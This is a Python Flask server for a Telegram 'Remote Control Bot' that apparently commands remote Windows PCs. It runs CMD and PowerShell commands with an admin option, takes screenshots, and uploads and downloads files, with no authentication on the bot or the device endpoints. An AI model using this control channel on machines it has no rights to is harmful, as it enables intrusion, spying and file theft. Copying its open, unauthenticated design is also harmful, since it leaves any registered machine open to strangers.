import os
import json
import uuid
import threading
import time
import base64
import io
import requests
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

# ========== КОНФИГУРАЦИЯ (переменные окружения Render) ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ========== ХРАНИЛИЩА В ПАМЯТИ ==========
devices = {}            # {device_id: {id, name, last_seen, online}}
devices_lock = threading.Lock()

pending_commands = {}   # {cmd_id: {device_id, type, command, admin, status, chat_id, ...}}
commands_lock = threading.Lock()

file_storage = {}       # {cmd_id: {filename, data(bytes)}}
file_storage_lock = threading.Lock()

user_states = {}        # {chat_id: {device_id, admin, awaiting}}
user_states_lock = threading.Lock()

# ========== TELEGRAM API HELPERS ==========

def tg_send(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(f"{API_URL}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"tg_send error: {e}")


def tg_send_photo(chat_id, photo_bytes):
    try:
        requests.post(
            f"{API_URL}/sendPhoto",
            data={"chat_id": chat_id},
            files={"photo": ("screenshot.png", photo_bytes, "image/png")},
            timeout=30
        )
    except Exception as e:
        print(f"tg_send_photo error: {e}")


def tg_send_document(chat_id, file_bytes, filename):
    try:
        requests.post(
            f"{API_URL}/sendDocument",
            data={"chat_id": chat_id},
            files={"document": (filename, file_bytes)},
            timeout=60
        )
    except Exception as e:
        print(f"tg_send_document error: {e}")


def tg_answer_callback(query_id):
    try:
        requests.post(f"{API_URL}/answerCallbackQuery",
                       json={"callback_query_id": query_id}, timeout=5)
    except:
        pass


# ========== KEYBOARDS ==========

def get_online_devices():
    """Возвращает список онлайн-устройств (heartbeat < 90 сек)."""
    with devices_lock:
        current = time.time()
        online = []
        for dev in devices.values():
            if current - dev["last_seen"] < 90:
                dev["online"] = True
                online.append(dev)
            else:
                dev["online"] = False
        return online


def devices_keyboard():
    online = get_online_devices()
    if not online:
        return None
    keyboard = []
    for dev in online:
        keyboard.append([{"text": f"🖥 {dev['name']}", "callback_data": f"sel:{dev['id']}"}])
    keyboard.append([{"text": "🔄 Обновить", "callback_data": "refresh"}])
    return {"inline_keyboard": keyboard}


def action_keyboard(dev_id, admin=False):
    admin_text = "☑️ Админ: ВКЛ" if admin else "☐ Админ: ВЫКЛ"
    return {"inline_keyboard": [
        [{"text": "💻 CMD", "callback_data": f"cmd:{dev_id}"},
         {"text": "⚡ PowerShell", "callback_data": f"psh:{dev_id}"}],
        [{"text": "🚀 Win+R", "callback_data": f"run:{dev_id}"}],
        [{"text": admin_text, "callback_data": f"adm:{dev_id}"}],
        [{"text": "📸 Скриншот", "callback_data": f"scr:{dev_id}"}],
        [{"text": "📤 Файл → ПК", "callback_data": f"sf:{dev_id}"},
         {"text": "📥 Файл ← ПК", "callback_data": f"gf:{dev_id}"}],
        [{"text": "⬅️ Назад", "callback_data": "back"}]
    ]}


# ========== TELEGRAM WEBHOOK HANDLER ==========

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.json
    try:
        if "callback_query" in data:
            handle_callback(data["callback_query"])
        elif "message" in data:
            handle_message(data["message"])
    except Exception as e:
        print(f"Webhook error: {e}")
    return jsonify({"ok": True})


def handle_callback(query):
    chat_id = query["message"]["chat"]["id"]
    cb_data = query["data"]
    tg_answer_callback(query["id"])

    if cb_data in ("refresh", "back"):
        kb = devices_keyboard()
        if kb:
            tg_send(chat_id, "📱 Онлайн устройства:", reply_markup=kb)
        else:
            tg_send(chat_id, "❌ Нет онлайн устройств")
        return

    if cb_data.startswith("sel:"):
        dev_id = cb_data.split(":", 1)[1]
        with user_states_lock:
            user_states[chat_id] = {"device_id": dev_id, "admin": False}
        tg_send(chat_id, "🎮 Выберите действие:", reply_markup=action_keyboard(dev_id))
        return

    if cb_data.startswith("adm:"):
        dev_id = cb_data.split(":", 1)[1]
        with user_states_lock:
            st = user_states.get(chat_id, {"device_id": dev_id, "admin": False})
            st["admin"] = not st.get("admin", False)
            st["device_id"] = dev_id
            user_states[chat_id] = st
            admin = st["admin"]
        state_text = "ВКЛ ✅" if admin else "ВЫКЛ ❌"
        tg_send(chat_id, f"Админ-режим: {state_text}", reply_markup=action_keyboard(dev_id, admin))
        return

    if cb_data.startswith(("cmd:", "psh:", "run:")):
        parts = cb_data.split(":", 1)
        cmd_type = parts[0]
        dev_id = parts[1]
        with user_states_lock:
            st = user_states.get(chat_id, {"device_id": dev_id, "admin": False})
            st["device_id"] = dev_id
            st["awaiting"] = cmd_type
            user_states[chat_id] = st
        names = {"cmd": "CMD", "psh": "PowerShell", "run": "Win+R"}
        tg_send(chat_id, f"⌨️ Введите команду ({names[cmd_type]}):")
        return

    if cb_data.startswith("scr:"):
        dev_id = cb_data.split(":", 1)[1]
        send_command_to_device(chat_id, dev_id, "screenshot", "")
        return

    if cb_data.startswith("sf:"):
        dev_id = cb_data.split(":", 1)[1]
        with user_states_lock:
            st = user_states.get(chat_id, {"device_id": dev_id, "admin": False})
            st["device_id"] = dev_id
            st["awaiting"] = "sendfile"
            user_states[chat_id] = st
        tg_send(chat_id, "📎 Отправьте файл (документом) для передачи на ПК:")
        return

    if cb_data.startswith("gf:"):
        dev_id = cb_data.split(":", 1)[1]
        with user_states_lock:
            st = user_states.get(chat_id, {"device_id": dev_id, "admin": False})
            st["device_id"] = dev_id
            st["awaiting"] = "getfile"
            user_states[chat_id] = st
        tg_send(chat_id, "📁 Введите полный путь к файлу на ПК\nНапример: C:\\Users\\User\\Desktop\\file.txt")
        return


def handle_message(msg):
    chat_id = msg["chat"]["id"]
    text = msg.get("text", "")

    if text == "/start":
        kb = devices_keyboard()
        if kb:
            tg_send(chat_id, "🤖 <b>Remote Control Bot</b>\n\n📱 Онлайн устройства:", reply_markup=kb)
        else:
            tg_send(chat_id, "🤖 <b>Remote Control Bot</b>\n\n❌ Нет онлайн устройств.\nОжидание подключения...")
        return

    with user_states_lock:
        st = user_states.get(chat_id)
    if not st:
        return

    awaiting = st.get("awaiting")
    dev_id = st.get("device_id")
    admin = st.get("admin", False)

    # --- Ожидание ввода команды ---
    if awaiting in ("cmd", "psh", "run"):
        del st["awaiting"]
        send_command_to_device(chat_id, dev_id, awaiting, text, admin)
        return

    # --- Ожидание пути файла (получить с ПК) ---
    if awaiting == "getfile":
        del st["awaiting"]
        send_command_to_device(chat_id, dev_id, "get_file", text)
        return

    # --- Ожидание файла (отправить на ПК) ---
    if awaiting == "sendfile" and "document" in msg:
        del st["awaiting"]
        file_id = msg["document"]["file_id"]
        filename = msg["document"]["file_name"]
        try:
            info = requests.get(f"{API_URL}/getFile",
                                params={"file_id": file_id}, timeout=10).json()
            fpath = info["result"]["file_path"]
            furl = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fpath}"
            fdata = requests.get(furl, timeout=60).content
        except Exception as e:
            tg_send(chat_id, f"❌ Ошибка загрузки файла: {e}")
            return

        cmd_id = str(uuid.uuid4())
        with file_storage_lock:
            file_storage[cmd_id] = {"filename": filename, "data": fdata}
        with commands_lock:
            pending_commands[cmd_id] = {
                "device_id": dev_id, "type": "recv_file",
                "status": "pending", "chat_id": chat_id,
                "filename": filename
            }
        tg_send(chat_id, f"📤 Файл '{filename}' отправляется на ПК...")
        return


def send_command_to_device(chat_id, dev_id, cmd_type, command_text, admin=False):
    cmd_id = str(uuid.uuid4())
    with commands_lock:
        pending_commands[cmd_id] = {
            "device_id": dev_id, "type": cmd_type,
            "command": command_text, "admin": admin,
            "status": "pending", "chat_id": chat_id
        }
    tg_send(chat_id, "⏳ Команда отправлена...")


# ========== CLIENT API ENDPOINTS ==========

@app.route("/register", methods=["POST"])
def client_register():
    """Регистрация устройства."""
    data = request.json
    dev_name = data.get("name", "Unknown")
    dev_id = data.get("device_id", str(uuid.uuid4()))
    with devices_lock:
        devices[dev_id] = {
            "id": dev_id, "name": dev_name,
            "last_seen": time.time(), "online": True
        }
    print(f"Device registered: {dev_name} ({dev_id})")
    return jsonify({"device_id": dev_id, "ok": True})


@app.route("/poll/<dev_id>", methods=["GET"])
def client_poll(dev_id):
    """Опрос команд для устройства."""
    with devices_lock:
        if dev_id in devices:
            devices[dev_id]["last_seen"] = time.time()
            devices[dev_id]["online"] = True
        else:
            return jsonify({"error": "unknown"}), 404

    with commands_lock:
        for cid, cmd in pending_commands.items():
            if cmd["device_id"] == dev_id and cmd["status"] == "pending":
                cmd["status"] = "sent"
                return jsonify({
                    "command_id": cid,
                    "type": cmd["type"],
                    "command": cmd.get("command", ""),
                    "admin": cmd.get("admin", False),
                    "filename": cmd.get("filename", "")
                })
    return jsonify({"command_id": None})


@app.route("/result/<cmd_id>", methods=["POST"])
def client_result(cmd_id):
    """Получение результата от клиента."""
    data = request.json
    with commands_lock:
        cmd = pending_commands.get(cmd_id)
        if not cmd:
            return jsonify({"error": "unknown"}), 404
        chat_id = cmd.get("chat_id")
        cmd_type = cmd["type"]

    if cmd_type == "screenshot":
        b64 = data.get("result", "")
        if b64:
            try:
                img = base64.b64decode(b64)
                tg_send_photo(chat_id, img)
            except Exception as e:
                tg_send(chat_id, f"❌ Ошибка скриншота: {e}")
        else:
            tg_send(chat_id, f"❌ {data.get('error', 'Скриншот не получен')}")

    elif cmd_type == "get_file":
        b64 = data.get("result", "")
        fname = data.get("filename", "file")
        if b64:
            try:
                fdata = base64.b64decode(b64)
                tg_send_document(chat_id, fdata, fname)
            except Exception as e:
                tg_send(chat_id, f"❌ Ошибка файла: {e}")
        else:
            tg_send(chat_id, f"❌ {data.get('error', 'Файл не получен')}")

    elif cmd_type == "recv_file":
        if data.get("success"):
            tg_send(chat_id, "✅ Файл доставлен на ПК (сохранён на Рабочий стол)")
        else:
            tg_send(chat_id, f"❌ {data.get('error', 'Ошибка доставки')}")

    else:
        # Текстовый результат команды
        result_text = data.get("result", "")
        if len(result_text) > 4000:
            result_text = result_text[:4000] + "\n... (обрезано)"
        tg_send(chat_id, f"✅ Результат:\n<pre>{result_text}</pre>")

    with commands_lock:
        pending_commands.pop(cmd_id, None)
    return jsonify({"ok": True})


@app.route("/download/<cmd_id>", methods=["GET"])
def client_download(cmd_id):
    """Скачивание файла клиентом (для recv_file)."""
    with file_storage_lock:
        f = file_storage.get(cmd_id)
        if not f:
            return jsonify({"error": "not found"}), 404
        return send_file(io.BytesIO(f["data"]),
                         as_attachment=True,
                         download_name=f["filename"])


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "devices": len(devices)})


# ========== WEBHOOK SETUP ==========

def set_webhook():
    if BOT_TOKEN and WEBHOOK_URL:
        url = f"{WEBHOOK_URL}/webhook"
        try:
            r = requests.get(f"{API_URL}/setWebhook",
                             params={"url": url}, timeout=10)
            print(f"Webhook set: {r.json()}")
        except Exception as e:
            print(f"Webhook error: {e}")
    else:
        print("BOT_TOKEN or WEBHOOK_URL not set!")


threading.Thread(target=set_webhook, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)